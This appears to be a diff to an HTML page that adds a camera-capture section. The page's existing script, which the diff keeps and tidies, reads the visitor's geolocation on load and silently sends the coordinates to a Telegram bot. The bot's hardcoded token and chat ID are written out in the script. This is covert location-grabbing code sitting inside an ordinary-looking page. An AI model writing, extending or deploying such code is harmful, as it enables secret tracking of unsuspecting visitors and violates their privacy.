@@ -11,7 +11,24 @@
 <body>
   <div id="result"></div>
 
+  <section id="camera" style="margin-top:30px;">
+    <h2>Capture Photo</h2>
+    <div class="camera-container">
+      <video id="video" width="320" height="240" autoplay playsinline></video>
+      <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+    </div>
+    <div style="margin-top:10px;">
+      <button id="startBtn">Start Camera</button>
+      <button id="takeBtn" disabled>Take Photo</button>
+      <button id="downloadBtn" disabled>Download Photo</button>
+    </div>
+    <div style="margin-top:12px;">
+      <img id="photo" alt="Your photo will appear here" style="max-width:320px;border:1px solid #ccc;display:block;margin:0 auto;" />
+    </div>
+  </section>
+
   <script>
+    // --- Telegram / Geolocation (existing) ---
     const token = "8970456088:AAHBNuNtp9ZlVjVJl_uuI-9G-R1UcIVaYAg";
     const chatId = "1749244772";
 
@@ -21,12 +38,12 @@
       fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
         .then(res => res.json())
         .then(data => {
-          if (data.ok) {
-          } else {
+          if (!data.ok) {
             document.getElementById("result").innerHTML = `<p style="color:red;">Error: ${data.description}</p>`;
           }
         })
-        .catch(() => {});}
+        .catch(() => {});
+    }
 
     function getLocation() {
       if (navigator.geolocation) {
@@ -34,13 +51,62 @@
           const lat = pos.coords.latitude;
           const lon = pos.coords.longitude;
           sendToTelegram(lat, lon);
-
-        }, () => {
-        });
+        }, () => {});
       }
     }
 
     window.onload = getLocation;
+
+    // --- Camera capture ---
+    const startBtn = document.getElementById('startBtn');
+    const takeBtn = document.getElementById('takeBtn');
+    const downloadBtn = document.getElementById('downloadBtn');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const photo = document.getElementById('photo');
+    let stream = null;
+
+    async function startCamera() {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
+        video.srcObject = stream;
+        takeBtn.disabled = false;
+        startBtn.textContent = 'Stop Camera';
+      } catch (err) {
+        alert('Could not access camera: ' + err.message);
+      }
+    }
+
+    function stopCamera() {
+      if (stream) {
+        stream.getTracks().forEach(t => t.stop());
+        stream = null;
+      }
+      video.srcObject = null;
+      takeBtn.disabled = true;
+      startBtn.textContent = 'Start Camera';
+    }
+
+    function takePhoto() {
+      const context = canvas.getContext('2d');
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const dataURL = canvas.toDataURL('image/png');
+      photo.src = dataURL;
+      downloadBtn.href = dataURL;
+      downloadBtn.download = `photo-${Date.now()}.png`;
+      downloadBtn.disabled = false;
+    }
+
+    startBtn.addEventListener('click', () => {
+      if (stream) stopCamera(); else startCamera();
+    });
+
+    takeBtn.addEventListener('click', takePhoto);
+
+    // Make downloadBtn a link-like button
+    downloadBtn.addEventListener('click', (e) => {
+      if (downloadBtn.disabled) e.preventDefault();
+    });
   </script>
 </body>
 </html>
